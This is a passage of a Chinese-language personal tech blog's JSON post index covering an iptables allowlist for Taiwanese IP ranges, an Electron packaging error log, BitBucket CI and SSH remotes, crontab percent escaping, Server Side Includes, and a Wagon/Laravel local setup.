1.160.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">#dai taipei 61.70.239.206</span><br><span class=\"line\">iptables -A INPUT -s 115.43.78.0/24 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#3 ip-prefix split</span><br><span class=\"line\">iptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.141.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#emonme ip-prefix</span><br><span class=\"line\">iptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 42.64.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#ALL INTO 80 port</span><br><span class=\"line\">#iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">#tranmission</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT</span><br></pre></td></tr></table></figure></p>\n<p>最近在COSCUP 2017聽到iptables設定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">iptables -P INPUT ACCEPT</span><br><span class=\"line\">iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">iptables -P FORWARD ACCEPT</span><br><span class=\"line\">....</span><br><span class=\"line\">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure>\n<p>所以要改一下，還要開放443 port<br><code>iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT</code><br>-A 是增加iptable條件。如果iptable已經有4個。打下一個指令會變成有5個</p>\n<p>-s 來源<br>-p port<br><code>iptables -A INPUT -s 0/0 -p tcp --dport 443 -j ACCEPT</code></p>\n<p>修改後<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">iptables -F</span><br><span class=\"line\">iptables -P INPUT ACCEPT</span><br><span class=\"line\">iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">iptables -P FORWARD ACCEPT</span><br><span class=\"line\">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -i lo -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#taiwan ip input http:80</span><br><span class=\"line\">iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">#dai taipei 61.70.239.206</span><br><span class=\"line\">iptables -A INPUT -s 115.43.78.0/24 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#3 ip-prefix split</span><br><span class=\"line\">iptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.141.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#emonme ip-prefix</span><br><span class=\"line\">iptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 42.64.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#ALL INTO 80 port</span><br><span class=\"line\">#iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">#tranmission</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"># https 443</span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure></p>\n<p>設定完了</p>\n","categories":["Linux"],"tags":["Linux","iptables"]},{"title":"electron 新手轉exe筆記","url":"/blog/2017/09/15/logdown/2017-09-15-2463354/","content":"<p>要做blog移轉，筆記先存檔…<br><a id=\"more\"></a></p>\n<p><a href=\"https://github.com/pfan123/electron-docs\" target=\"_blank\" rel=\"noopener\">https://github.com/pfan123/electron-docs</a></p>\n<p>Logdown<br><a href=\"https://logdown.com/account/posts/2463354/edit\" target=\"_blank\" rel=\"noopener\">https://logdown.com/account/posts/2463354/edit</a><br>electron-packager<br><a href=\"https://github.com/pfan123/electron-docs\" target=\"_blank\" rel=\"noopener\">https://github.com/pfan123/electron-docs</a><br>Getting Started for Electron<br><a href=\"https://help.syncfusion.com/js/electron\" target=\"_blank\" rel=\"noopener\">https://help.syncfusion.com/js/electron</a><br>demian85/electron-chat-app-demo: Simple Electron Chat App Demo (evaluation task)<br><a href=\"https://github.com/demian85/electron-chat-app-demo\" target=\"_blank\" rel=\"noopener\">https://github.com/demian85/electron-chat-app-demo</a><br>pfan123/electron-docs: electron-docs学习文档<br><a href=\"https://github.com/pfan123/electron-docs\" target=\"_blank\" rel=\"noopener\">https://github.com/pfan123/electron-docs</a><br>Squirrel.Windows/5-updating.md at master · Squirrel/Squirrel.Windows<br><a href=\"https://github.com/Squirrel/Squirrel.Windows/blob/master/docs/getting-started/5-updating.md\" target=\"_blank\" rel=\"noopener\">https://github.com/Squirrel/Squirrel.Windows/blob/master/docs/getting-started/5-updating.md</a></p>\n<p>chat package.json</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;dependencies&quot;: &#123;</span><br><span class=\"line\">  &quot;express&quot;: &quot;4.14.0&quot;,</span><br><span class=\"line\">  &quot;marked&quot;: &quot;^0.3.6&quot;,</span><br><span class=\"line\">  &quot;socket.io&quot;: &quot;1.4.8&quot;,</span><br><span class=\"line\">  &quot;babel-cli&quot;: &quot;^6.16.0&quot;,</span><br><span class=\"line\">  &quot;babel-preset-react&quot;: &quot;^6.16.0&quot;,</span><br><span class=\"line\">  &quot;electron&quot;: &quot;^1.4.2&quot;,</span><br><span class=\"line\">  &quot;eslint&quot;: &quot;^3.7.0&quot;,</span><br><span class=\"line\">  &quot;eslint-config-airbnb&quot;: &quot;^12.0.0&quot;,</span><br><span class=\"line\">  &quot;eslint-plugin-import&quot;: &quot;^1.16.0&quot;,</span><br><span class=\"line\">  &quot;eslint-plugin-jsx-a11y&quot;: &quot;^2.2.2&quot;,</span><br><span class=\"line\">  &quot;eslint-plugin-react&quot;: &quot;^6.3.0&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1181 verbose unbuild rmStuff eslint-config-airbnb@12.0.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules</span><br><span class=\"line\">1182 verbose unbuild rmStuff in node_modules</span><br><span class=\"line\">1183 info lifecycle eslint-config-airbnb@12.0.0~postuninstall: eslint-config-airbnb@12.0.0</span><br><span class=\"line\">1184 silly unbuild eslint@3.19.0</span><br><span class=\"line\">1185 info lifecycle eslint@3.19.0~preuninstall: eslint@3.19.0</span><br><span class=\"line\">1186 info lifecycle eslint@3.19.0~uninstall: eslint@3.19.0</span><br><span class=\"line\">1187 verbose unbuild rmStuff eslint@3.19.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules</span><br><span class=\"line\">1188 verbose unbuild rmStuff in node_modules</span><br><span class=\"line\">1189 verbose unlock done using C:\\Users\\Administrator\\AppData\\Roaming\\npm-cache\\_locks\\staging-834cabcd517fd52e.lock for C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.staging</span><br><span class=\"line\">1190 verbose stack Error: May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin</span><br><span class=\"line\">1190 verbose stack     at gentlyRm (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:49:15)</span><br><span class=\"line\">1190 verbose stack     at gentlyRmBinRoot (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\unbuild.js:86:12)</span><br><span class=\"line\">1190 verbose stack     at cb (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\async-map.js:47:24)</span><br><span class=\"line\">1190 verbose stack     at LOOP (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:7:26)</span><br><span class=\"line\">1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:18:7</span><br><span class=\"line\">1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:70:40</span><br><span class=\"line\">1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:16:22</span><br><span class=\"line\">1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\iferr\\index.js:11:16</span><br><span class=\"line\">1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\graceful-fs\\polyfills.js:284:29</span><br><span class=\"line\">1190 verbose stack     at FSReqWrap.oncomplete (fs.js:153:21)</span><br><span class=\"line\">1191 verbose cwd C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app</span><br><span class=\"line\">1192 verbose Windows_NT 10.0.15063</span><br><span class=\"line\">1193 verbose argv &quot;C:\\\\Program Files\\\\nodejs\\\\node.exe&quot; &quot;C:\\\\Program Files\\\\nodejs\\\\node_modules\\\\npm\\\\bin\\\\npm-cli.js&quot; &quot;prune&quot; &quot;--production&quot;</span><br><span class=\"line\">1194 verbose node v8.5.0</span><br><span class=\"line\">1195 verbose npm  v5.3.0</span><br><span class=\"line\">1196 error May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin</span><br><span class=\"line\">1197 verbose exit [ 1, true ]</span><br></pre></td></tr></table></figure>","categories":["electron"]},{"title":"BitBucket的CI簡單測試記錄","url":"/blog/2017/07/24/logdown/2017-07-24-2082428/","content":"<p>原本想使用python的yamllint<br>不過使用python的yamllint會有一些問題<br>像一行超過80個字  (奇怪…有這個規定??)</p>\n<p>後來用node的yamllint就沒問題<br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pipelines:</span><br><span class=\"line\">  default:</span><br><span class=\"line\">    - step:</span><br><span class=\"line\">        script: # Modify the commands below to build your repository.</span><br><span class=\"line\">          - npm install -g yaml-lint</span><br><span class=\"line\">          - yamllint bitbucket-pipelines.yml</span><br></pre></td></tr></table></figure>\n<p>錯誤時候，會發Email通知，成功不會發通知。<br>有空再好好研究還能怎麼玩:P</p>\n<p>參考來源：<br><a href=\"http://ithelp.ithome.com.tw/articles/10187774\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10187774</a><br><a href=\"http://ithelp.ithome.com.tw/articles/10187137\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10187137</a></p>\n","categories":["CI"],"tags":["CI","BitBucket"]},{"title":"Server Side Includes(SSI)記錄","url":"/blog/2017/09/20/logdown/2017-09-20-2511953/","content":"<p>今天同事請較我，順便讓我看到他網站有類似用include方法載入別的頁面<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--#include virtual=\"../quote.txt\" --&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>但這個我沒看過…<br>搜尋一下是，Server Side Includes<br><a id=\"more\"></a></p>\n<p>因為沒有看過<br>覺得還滿奇特，記錄一下XD</p>\n<p>感覺就像include網頁，現在每個程式應該都有include功能才是<br>可能靜態網頁就沒有了</p>\n<p>有看到有安全性的問題<br>目前可能猜想跟XSS有關係吧</p>\n<p><a href=\"https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C</a></p>\n","categories":["Apache"],"tags":["Apache","SSI"]},{"title":"Crontab指令打百分比需要跳脫符號","url":"/blog/2017/11/05/logdown/2017-11-05-3279650/","content":"<p>最近發現我上次設定的crontab 指令沒有成功<br>仔細看了一下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nov  1 01:00:01 raspberrypi /USR/SBIN/CRON[1361]: (debian-transmission) CMD (mkdir /mnt/extHDD/Download/Mikata/`date &quot;+)</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p> grep CRON /var/log/syslog</p>\n<p>  cron log:/var/log/cron</p>\n<p>難道crontab不能打百分比，需要補個跳拖字元…<br>google一下，發現還真的有<br><a href=\"https://tlanyan.me/percent-sign-in-crontab/\" target=\"_blank\" rel=\"noopener\">https://tlanyan.me/percent-sign-in-crontab/</a></p>\n<p>這次還忘記要怎麼切換權限，那個沒特別開一個文章<br>不過好險有做筆記的習慣，真的文章一找就有。<br>覺得下次記一下，怎麼切換別的帳號<br>不然太久真的忘記了</p>\n","categories":["Linux"],"tags":["Linux","Crontab"]},{"title":"[BitBucket]做git pull一直問你輸入密碼","url":"/blog/2017/11/06/logdown/2017-11-06-3301727/","content":"<p>前幾個月有個程式，因為需要多人做設定檔<br>所以就使用bitbucket來管理<br>在樹莓派一直遇到要打帳號、密碼<br>其怪，私鑰那些我都要試過阿</p>\n<p>結果Google一下，發現這篇<br><a href=\"https://stackoverflow.com/questions/8600652/git-on-bitbucket-always-asked-for-password-even-after-uploading-my-public-ssh?noredirect=1&amp;lq=1\" target=\"_blank\" rel=\"noopener\">Git on Bitbucket: Always asked for password, even after uploading my public SSH key - Stack Overflow</a><br>預設是https情況下會問密碼<br>在.git/config把網址改成ssh網址確實可運做了<br><code>ssh://git@bitbucket.org/userName/repoName.git</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">As explained here, if you clone with SSH url, you don&apos;t need to enter username / password each time you push / pull. Check above answer by @manojlds</span><br><span class=\"line\"></span><br><span class=\"line\">But if you want to clone with HTTPS and want to avoid entering username / password each time, you can store credentials into cache with below command:</span><br><span class=\"line\"></span><br><span class=\"line\">git config --global credential.helper &apos;cache --timeout 3600&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">where 3600 (seconds) means 1 hour, you may change it as per your requirement.</span><br></pre></td></tr></table></figure>\n<p>網路上有一個解法，<code>http://username:password@bitbucket.org/...</code><br>但感覺不安全….</p>\n","categories":["Git"],"tags":["git","BitBucket"]},{"title":"wagon架設筆記","url":"/blog/2017/11/18/logdown/2017-11-18-3523814/","content":"<p>試著用wagon架設laravel<br>先做一下筆記….</p>\n<a id=\"more\"></a>\n<p><a href=\"https://github.com/laravel-dojo/wagon/releases\" target=\"_blank\" rel=\"noopener\">Releases · laravel-dojo/wagon</a>下載解壓縮</p>\n<ol>\n<li>執行<code>/wagon/uwamp/UwAmp.exe</code></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Apache 已啟用 rewrite module、Document Root 設定在 wagon\\uwamp\\www\\default、port 改設定為 8000</span><br><span class=\"line\">MySQL port 改設定為 33060，可用 root/root 登入</span><br><span class=\"line\">adminer 位置為 http://localhost:8000/adminer</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li><p>想使用內建Laravel-demo範例，可參考www/demo1<br>點擊 apache config 更改 wagon:8000裡的 Document Root: <code>{DOCUMENTPATH}/demo1/public</code></p>\n</li>\n<li><p>調整laravel env mysql環境變數<br>EX:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DB_CONNECTION=mysql</span><br><span 